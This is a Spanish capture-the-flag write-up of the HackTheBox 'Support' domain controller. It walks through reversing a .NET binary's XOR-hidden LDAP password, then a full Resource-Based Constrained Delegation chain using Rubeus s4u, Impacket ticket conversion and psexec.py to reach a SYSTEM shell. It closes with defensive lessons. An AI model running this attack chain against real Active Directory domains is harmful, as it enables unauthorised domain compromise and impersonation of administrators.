Support es un **Domain Controller de Active Directory Windows** — la signature de puertos AD (53/88/389/445/636/3268/3269/9389) hace el rol obvio antes de la primera sonda. SMB con sesión NULL lista shares incluyendo `support-tools`, que es legible anónimamente y contiene `UserInfo.exe.zip`. El **binario .NET** extraído, descompilado con **ILSpy**, expone un constructor `LdapQuery` que se ata a LDAP como `support\ldap` y una función `Protected.getPassword()` que descifra por XOR una cadena base64 embebida contra la clave `armando` con la constante `0xDF` — revertir el XOR (que es simétrico) recupera el plaintext `nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz`. La enumeración LDAP autenticada revela que el campo `info` del usuario `support` contiene la contraseña `Ironside47pleasure40Watchful` (un clásico apunte-para-mí de administrador escrito en un atributo LDAP), dando acceso WinRM y la flag de usuario. La recolección de **BloodHound** muestra que `support` es miembro del grupo `Shared Support Accounts`, que tiene **GenericAll** sobre el DC — una ACL que desbloquea un ataque de **Resource-Based Constrained Delegation**: crear una cuenta de máquina controlada vía Powermad (el default de `MachineAccountQuota` de 10 lo permite para cualquier usuario autenticado), configurar `msDS-AllowedToActOnBehalfOfOtherIdentity` en el DC para que confíe en esa cuenta, y usar **Rubeus s4u** (S4U2self + S4U2proxy) para acuñar un ticket Kerberos de servicio para `cifs/dc.support.htb` impersonando a **Administrator**. El ticket `.kirbi` se convierte a ccache con el `ticketConverter.py` de Impacket, y `psexec.py -k -no-pass` da una shell de **NT AUTHORITY\SYSTEM** en el DC.

## Reconocimiento y Enumeración

El objetivo de esta fase fue identificar el rol de la máquina y enumerar los servicios expuestos.

### Descubrimiento del Host

Comprobación de alcance y pista sobre el sistema operativo mediante ICMP:

```bash
ping -c 1 10.129.65.16
PING 10.129.65.16 (10.129.65.16) 56(84) bytes of data.
64 bytes from 10.129.65.16: icmp_seq=1 ttl=127 time=43.6 ms
```

Un TTL de **127** indica un host **Windows** (por defecto 128, decrementado una vez al atravesar el salto de enrutamiento). Este es el primer dato de fingerprinting: las cajas Linux típicamente devuelven TTL 63 (desde un default de 64); Windows devuelve TTL 127 (desde un default de 128).

## Reverse Engineering — `UserInfo.exe` (assembly .NET)

Descomprimir reveló una aplicación .NET con varias dependencias DLL:

```bash

UserInfo.exe: PE32 executable for MS Windows 6.00 (console), Intel i386 Mono/.Net assembly, 3 sections
```

La etiqueta `Mono/.Net assembly` es el detalle pivotal. Los binarios .NET se distribuyen como **bytecode CIL**, no como código máquina nativo — lo que significa que pueden ser **descompilados casi sin pérdidas** de vuelta a C# legible. La herramienta estándar es **ILSpy**, un descompilador .NET open-source que reconstruye la fuente original a partir del CIL, con nombres de clase, firmas de método, y — críticamente — constantes de cadena hardcoded que aparecen como código literal.

Configurando ILSpy en Linux:

```bash

unzip Linux.x64.Release.zip
unzip ILSpy-linux-x64-Release.zip
cd artifacts/linux-x64/
./ILSpy
```

Abrir `UserInfo.exe` desde `File → Open` carga el assembly y puebla la vista de árbol con todos los namespaces y tipos:

![ILSpy main window showing the decompiler UI with System.Private assemblies loaded on the left and the ILSpy version banner and license information on the right](/assets/img/HTB/Support/cap1.png)

### El constructor `LdapQuery` — credencial y nombre de usuario hardcoded

El constructor de `LdapQuery` revela lo que la herramienta hace por debajo:

![ILSpy showing the decompiled UserInfo.Services.LdapQuery class with the LdapQuery constructor binding to LDAP://support.htb using the identity "support\\ldap" and a password obtained from Protected.getPassword()](/assets/img/HTB/Support/cap2.png)

```csharp
public LdapQuery()
{
    string password = Protected.getPassword();
    entry = new DirectoryEntry("LDAP://support.htb", "support\\ldap", password);
    entry.set_AuthenticationType((AuthenticationTypes)1);
    ds = new DirectorySearcher(entry);
}
```

Tres datos de este método son inmediatamente accionables:

1. **El endpoint LDAP** — `LDAP://support.htb` (coincide con el dominio de nmap)
2. **La identidad que autentica** — `support\ldap`, es decir, dominio `SUPPORT` con sAMAccountName `ldap`. Este es un **nombre de cuenta de servicio que existirá en el dominio** — la mitad de una credencial válida
3. **La contraseña se calcula dinámicamente** por `Protected.getPassword()`. Todo lo necesario para recuperarla está dentro del binario

### `Protected.getPassword()` — la cadena de XOR

Siguiendo la referencia a `Protected.getPassword()`:

![ILSpy showing the decompiled UserInfo.Services.Protected.getPassword() function which base64-decodes enc_password and applies a double XOR against key and the constant 0xDFu, then returns the decoded string](/assets/img/HTB/Support/cap3.png)

```csharp
public static string getPassword()
{
    byte[] array = Convert.FromBase64String(enc_password);
    byte[] array2 = array;
    for (int i = 0; i < array.Length; i++)
    {
        array2[i] = (byte)((uint)(array[i] ^ key[i % key.Length]) ^ 0xDFu);
    }
    return Encoding.Default.GetString(array2);
}
```

La rutina es un doble-XOR: cada byte del texto cifrado se XORea con un byte rotante de la clave, luego se XORea de nuevo con la constante `0xDF`, y el resultado es el byte del plaintext. Esto parece intimidante en la primera lectura, pero **XOR es su propio inverso** — aplicar la misma operación al texto cifrado produce el plaintext. La misma rutina es tanto el cifrado como el descifrado.

### La cadena cifrada y la clave

Ambos operandos del XOR son campos estáticos hardcoded en la clase `Protected`:

![ILSpy showing the private static string field enc_password with a base64-encoded value "0Nv32PTwgYjzg9/8j5TbmvPd3e7WhtWWyuPsyO76/Y+U193E"](/assets/img/HTB/Support/cap4.png)

```csharp
private static string enc_password = "0Nv32PTwgYjzg9/8j5TbmvPd3e7WhtWWyuPsyO76/Y+U193E";
```

![ILSpy showing the private static byte array key initialized as Encoding.ASCII.GetBytes("armando")](/assets/img/HTB/Support/cap5.png)

```csharp
private static byte[] key = Encoding.ASCII.GetBytes("armando");
```

Todo lo necesario para revertir la contraseña ahora es visible: el ciphertext en base64, la clave `armando`, y la constante XOR `0xDF`.

### Revirtiendo el XOR

Un script Python corto que replica la lógica del C#:

```python
import base64

enc_password = "0Nv32PTwgYjzg9/8j5TbmvPd3e7WhtWWyuPsyO76/Y+U193E"
key = b"armando"
CONST = 0xDF

def get_password(enc_b64: str, key: bytes, const: int) -> str:
    cifrado = base64.b64decode(enc_b64)
    claro = bytearray(len(cifrado))
    for i in range(len(cifrado)):
        claro[i] = (cifrado[i] ^ key[i % len(key)]) ^ const
    return claro.decode("utf-8", errors="replace")

if __name__ == "__main__":
    print(f"[+] Password: {get_password(enc_password, key, CONST)}")
```

Ejecutándolo:

```bash
python3 xor.py
[+] Password: nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz
```

## Escalada de Privilegios — Resource-Based Constrained Delegation

### Entendiendo RBCD

Kerberos tiene dos extensiones "S4U" (Service-for-User):

- **S4U2self** — un servicio puede solicitar un service ticket para sí mismo, impersonando a cualquier usuario. Esto existe para que un frontend web pueda obtener una identidad Kerberos para un usuario que se ha autenticado por algún medio no-Kerberos (un login por formulario, una smart card, etc.) y luego usar esa identidad contra servicios downstream.
- **S4U2proxy** — un servicio puede convertir un ticket S4U2self del usuario X en un service ticket que el usuario X usaría para autenticarse a un servicio *diferente*. Esta es la parte de "delegation": el servicio frontend puede actuar en nombre del usuario contra un backend.

En la delegación restringida "tradicional", la lista de servicios a los que un servicio dado puede delegar se almacena en la cuenta **frontend** (en `msDS-AllowedToDelegateTo`). Configurar este atributo requiere `SeEnableDelegationPrivilege` — prácticamente, solo Domain Admins. Esta es la versión estricta.

**Resource-Based Constrained Delegation (RBCD)** invierte la dirección: la lista de cuentas que pueden delegar *a* un servicio se almacena en la cuenta **target** (en `msDS-AllowedToActOnBehalfOfOtherIdentity`). Configurar este atributo requiere solo acceso de escritura al target — que es exactamente lo que concede `GenericAll`.

La secuencia del ataque:

1. Crear o tomar el control de una cuenta de máquina con un SPN — llamémosla `Monre$`.
2. Añadir el SID de `Monre$` al `msDS-AllowedToActOnBehalfOfOtherIdentity` del DC, diciéndole al KDC "`Monre$` está autorizado para delegar hacia mí".
3. Como `Monre$`, solicitar un ticket S4U2self hacia `Monre$` impersonando a `Administrator`.
4. Como `Monre$`, usar S4U2proxy para intercambiar ese ticket por un service ticket hacia `cifs/dc.support.htb` — aún como `Administrator`.
5. Usar el ticket resultante para autenticarse al servicio SMB del DC (que representa el SPN `cifs/`) como `Administrator` y sacar una shell.

### Chequeo de `ms-DS-MachineAccountQuota`

El paso 1 necesita una cuenta de máquina. Por defecto, **cualquier usuario autenticado del dominio puede añadir hasta 10 cuentas de máquina** vía `ms-DS-MachineAccountQuota` en la raíz del dominio. Verificando:

```powershell
*Evil-WinRM* PS C:\Users\support\Desktop> Get-ADObject -Identity ((Get-ADDomain).distinguishedname) -Properties ms-DS-MachineAccountQuota

DistinguishedName         : DC=support,DC=htb
ms-DS-MachineAccountQuota : 10
```

Valor por defecto, sin tocar. `support` puede crear cuentas de máquina libremente.

### Configurando `msDS-AllowedToActOnBehalfOfOtherIdentity` en el DC

El parámetro `-PrincipalsAllowedToDelegateToAccount` de Set-ADComputer es el wrapper user-friendly — acepta un nombre de principal y gestiona el descriptor de seguridad binario del atributo subyacente internamente:

```powershell

```

El DC ahora confía en `Monre$` para invocar S4U2proxy contra él mismo. Confirmando el SDDL del atributo subyacente a través de PowerView:

```powershell
*Evil-WinRM* PS C:\Users\support\Desktop> $ComputerSid = Get-DomainComputer DC -Properties 'msds-allowedtoactonbehalfofotheridentity' | Select -Expand msds-allowedtoactonbehalfofotheridentity
*Evil-WinRM* PS C:\Users\support\Desktop> $SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList $ComputerSid, 0
*Evil-WinRM* PS C:\Users\support\Desktop> $SD.DiscretionaryAcl

SecurityIdentifier : S-1-5-21-1677581083-3380853377-188903654-6102
```

`983551` es la representación numérica del acceso de control total; `S-1-5-21-...-6102` coincide con el SID de `Monre$` de la salida anterior de `Get-ADComputer`. RBCD está armado.

### Calculando el hash NT de la cuenta de máquina

Rubeus necesita el hash NT de la contraseña de `Monre$` para emitir la solicitud inicial de TGT. Hay dos formas de calcularlo — nativamente vía `Rubeus.exe hash` (modo offline), o vía `passlib.hash.nthash` de Python. Ambos producen resultados idénticos:

```bash
python3 -c 'from passlib.hash import nthash; print(nthash.hash("Monre123"))'
e4fbbc42d313656d830c386d4b433e79
```

Cross-verificación con Rubeus:

```powershell
*Evil-WinRM* PS C:\Users\support\Desktop> .\Rubeus.exe hash /password:Monre123 /user:Monre$ /domain:support.htb
[*] Action: Calculate Password Hash(es)
[*] Input password             : Monre123
[*]       rc4_hmac             : E4FBBC42D313656D830C386D4B433E79
[*]       aes128_cts_hmac_sha1 : 2A358DC9CB25D6508CD79527BF5AA943
[*]       aes256_cts_hmac_sha1 : 607F4C6BD91288D4F7254CD4D037D8289E6E6DED71A7F685596ED7EB3C35A97D
```

El valor `rc4_hmac` **ES** el hash NT. El mismo `e4fbbc42d313656d830c386d4b433e79` — el algoritmo de hash NT es MD4(unicode(password)) sin salt, así que cualquier cálculo contra el mismo plaintext produce el mismo hash.

### Rubeus S4U — la danza Kerberos completa

`Rubeus.exe s4u` ejecuta toda la danza de delegación en una sola invocación:

```powershell
*Evil-WinRM* PS C:\Users\support\Desktop> .\Rubeus.exe s4u /user:Monre$ /rc4:E4FBBC42D313656D830C386D4B433E79 /impersonateuser:Administrator /msdsspn:cifs/dc.support.htb /domain:support.htb /ptt

[*] Using rc4_hmac hash: E4FBBC42D313656D830C386D4B433E79

```

Tres tickets se emiten en orden:

1. **TGT para `Monre$`** — obtenido vía AS-REQ usando el hash NT para pre-autenticación. Esta es la propia autenticación de Rubeus.
2. **TGS S4U2self** — un service ticket a `Monre$@SUPPORT.HTB` para el usuario `Administrator`. Este no es directamente útil (es un ticket a Monre$, no al DC), pero es el input al siguiente paso.
3. **TGS S4U2proxy para `cifs/dc.support.htb`** — el payload. Un service ticket al servicio SMB del DC, apareciendo venir de `Administrator`. Esto es lo que desbloquea el DC.

El flag `/ptt` importó el ticket en la sesión propia de Rubeus (útil si se ejecuta Rubeus en una caja Windows que ya tiene el equivalente de psexec). Pero como psexec.py corre en el lado atacante Linux, el ticket necesita ser exportado y convertido.

### De `.kirbi` de Rubeus a `.ccache` de Impacket

Rubeus emite el ticket en formato `.kirbi` — el formato nativo de fichero de ticket Kerberos de Windows. Las herramientas de Impacket hablan `.ccache`, el formato de caché de credenciales de MIT Kerberos. Impacket incluye un convertidor:

```bash
git clone https://github.com/fortra/impacket.git
python3 -m venv .venv && source .venv/bin/activate
pip install impacket

# Copiar el último blob base64 (S4U2proxy) del output de Rubeus a ticket.kirbi.b64
# y luego base64-decodearlo:
base64 -d ticket.kirbi.b64 > ticket.kirbi

python3 impacket/examples/ticketConverter.py ticket.kirbi ticket.ccache
Impacket v0.13.1 - Copyright Fortra, LLC
[*] converting kirbi to ccache...
[+] done
```

### `psexec.py -k -no-pass` → NT AUTHORITY\SYSTEM

El paso final. `psexec.py` de Impacket sube un binario de servicio al share `ADMIN$` del target, lo registra como servicio Windows, y lo arranca — produciendo una shell interactiva como `NT AUTHORITY\SYSTEM`. Con `-k`, la autenticación es basada en Kerberos (leyendo las credenciales de `KRB5CCNAME`); `-no-pass` se salta el prompt de contraseña ya que el ticket es la credencial:

```bash
KRB5CCNAME=ticket.ccache psexec.py support.htb/administrator@dc.support.htb -k -no-pass
```

## Lecciones Clave

- **La signature de puertos AD (53/88/389/636/3268/3269/9389 + puertos RPC de números altos) es un fingerprint de Domain Controller.** En un target Windows, la presencia de todos estos juntos es el atajo operacional para "esto es un DC" — el rol específico que aloja cada principal en el dominio, cada ACL, cada clave Kerberos. La fase de recon contra un target Windows debería incluir un checkbox mental para este patrón; cuando coincide, el modelo mental del engagement cambia de "comprometer este host" a "abusar este dominio".
- **El listado de shares por sesión NULL sigue siendo el default de Windows Server 2022.** Incluso con firma SMB requerida y SMBv1 deshabilitado, `smbclient -N` enumera el catálogo de shares. Los shares custom (cualquier cosa fuera de `ADMIN$/C$/IPC$/NETLOGON/SYSVOL`) merecen chequearse anónimamente — `support-tools` aquí era alcanzable sin credenciales. El hardening `restrict anonymous` existe pero raramente se despliega.
- **Los assemblies .NET son efectivamente código fuente.** Los descompiladores como ILSpy, dnSpy y dotPeek reconstruyen C# casi original a partir del bytecode CIL, incluyendo cadenas hardcoded, nombres de método y flujo de control. Cualquier secreto embebido en un binario .NET es un secreto publicado a cualquiera que obtenga el binario. La "obfuscación custom" vía XOR, base64 o reversión — como en `UserInfo.exe` aquí — queda enteramente derrotada leyendo la fuente descompilada. El patrón correcto para almacenar secretos en aplicaciones .NET es cargarlos desde un almacén externo de secretos (DPAPI, Windows Credential Manager, Azure Key Vault); el patrón equivocado es escribir tu propio esquema en un binario descompilable.
- **XOR es simétrico y reversible.** Cualquier esquema de ofuscación de contraseñas construido sobre XOR — con una clave hardcoded, con una clave rotante, con una constante XOR mezclada — es trivialmente reversible leyendo la rutina de codificación y ejecutando la misma operación sobre el ciphertext. La complicación aparente de "dos XORs en secuencia" no añade seguridad; es lo mismo que un XOR con una clave computable. Si la función de descifrado de un esquema es `f^-1 = f`, un atacante con el ciphertext y el código recupera el plaintext sin criptoanálisis en absoluto.
- **El atributo LDAP `info` es una filtración de credenciales de texto libre sin restricciones.** Cada objeto usuario en AD tiene un atributo `info` pensado para notas arbitrarias — responsabilidades del puesto, extensiones de teléfono, notas de rotación de guardias. Es legible por cualquier usuario autenticado con permisos LDAP por defecto. Administradores poniendo contraseñas ahí — como con el `Ironside47pleasure40Watchful` del usuario `support` — es un anti-patrón recurrente. El chequeo blue-team es `Get-ADUser -Filter * -Properties info | Where-Object {$_.info -ne $null}`; el chequeo red-team es `ldapsearch ... '(info=*)'`. Ambos funcionan igual de bien.
- **BloodHound convierte AD de un grafo de "principals y permisos" en un grafo de "empieza aquí para llegar allá".** El valor de BloodHound no está en listar ACLs — eso ya lo hace LDAP — sino en computar rutas transitivas a través de membresías de grupo, ACLs delegadas y edges de object-control. Marcar cualquier principal como owned revela cada ruta que empieza desde él, y los paneles de ayuda integrados de la herramienta documentan la primitiva de explotación para cada tipo de edge. Esta es la diferencia de calidad de vida más grande entre engagements AD antes y después de 2016.
- **`GenericAll` sobre un objeto computer es Resource-Based Constrained Delegation.** GenericAll concede acceso de escritura a cada atributo del target, incluyendo `msDS-AllowedToActOnBehalfOfOtherIdentity`. Configurar este atributo con cualquier cuenta bajo control del atacante convierte la primitiva de escritura en impersonación Kerberos completa contra los servicios del target. Cuando cualquier ruta de BloodHound termina en "GenericAll sobre un computer", la forma del exploit está fijada: crear/controlar una cuenta de máquina, configurar el atributo de delegación, usar S4U2self+S4U2proxy para acuñar un ticket de Administrator.
- **`ms-DS-MachineAccountQuota` es 10 por defecto, y cualquier usuario autenticado puede añadir cuentas de máquina.** Este es el habilitador para cada ataque RBCD — sin él, un atacante sin control previo de una cuenta de máquina no puede crear el "principal que controlo" que RBCD requiere. Configurar el quota a 0 (vía `Set-ADDomain -Replace @{'ms-DS-MachineAccountQuota'=0}`) es un paso de hardening directo que cierra toda la clase de ataques RBCD para usuarios no privilegiados. Muy pocos entornos lo hacen.
- **S4U2self no es una vulnerabilidad; S4U2proxy contra un `msDS-AllowedToActOnBehalfOfOtherIdentity` controlado por el atacante sí lo es.** Las extensiones S4U existen por razones legítimas — frontends web impersonando usuarios contra servicios backend tras autenticación no-Kerberos. Lo que las convierte en escalada de privilegios es la capacidad de escribir la lista "quién puede invocar S4U2proxy contra mí" en un target de alto valor. El framing defensivo correcto es que el acceso de escritura a cualquiera de los atributos relacionados con delegación de una cuenta es equivalente a derechos persistentes de impersonación sobre esa cuenta.
- **La conversión Rubeus `.kirbi` ↔ Impacket `.ccache` es el puente estándar de ticket Kerberos cross-platform.** Las herramientas Windows (Rubeus, Mimikatz) producen `.kirbi`; las herramientas Linux (Impacket) consumen `.ccache`. `ticketConverter.py` es un convertidor de formato sin pérdidas, y configurar `KRB5CCNAME` en el entorno le dice a cualquier binario enlazado con MIT-Kerberos (incluyendo los examples de Impacket) que use el ticket importado como su autenticación. El workflow de dos toolchains — enumerar y acuñar en Windows, entregar desde Linux — es la forma operacional de una gran fracción de los engagements AD modernos.
- **`psexec.py -k -no-pass` es el estado terminal de shell SYSTEM de una cadena AD.** Una vez que un ticket Kerberos válido para `cifs/target` como cualquier principal equivalente a Administrator está disponible, el `psexec.py` de Impacket sube un binario de servicio vía el share `ADMIN$` del target, lo registra y lo arranca — lanzando una shell interactiva como `NT AUTHORITY\SYSTEM`. Este es el paso estándar de "cobrar el ticket": sin exploits adicionales, sin elevación de privilegios en el target, solo creación de servicio autenticada por Kerberos en un DC donde SMB signing está habilitado y requerido (porque eso está bien cuando el cliente posee un ticket válido).
